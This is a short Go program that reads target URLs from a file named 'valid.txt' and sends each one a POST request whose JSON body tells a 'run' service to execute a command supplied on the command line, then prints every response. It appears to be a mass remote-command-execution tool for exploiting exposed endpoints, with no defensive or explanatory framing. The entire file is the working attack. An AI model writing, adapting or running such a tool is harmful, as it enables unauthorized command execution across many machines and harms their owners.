package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Printf("How 2 use: %s <command>\n", os.Args[0])
		return
	}
	cmd := os.Args[1]


	file, err := os.Open("valid.txt")
	if err != nil {
		fmt.Printf("Failed to open valid.txt: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		targetURL := strings.TrimSpace(scanner.Text())
		if targetURL == "" {
			continue
		}


		payload := fmt.Sprintf(`{"service":"run","command":"%s"}`, cmd)

		req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
		if err != nil {
			fmt.Printf("Request creation error for %s: %v\n", targetURL, err)
			continue
		}

		req.Header.Set("Content-Type", "application/json") // add more headers if you think this ain enough :)
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Request failed for %s: %v\n", targetURL, err)
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		fmt.Printf("Response from %s:\n%s\n\n", targetURL, string(body))
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading valid.txt: %v\n", err)
	}
}
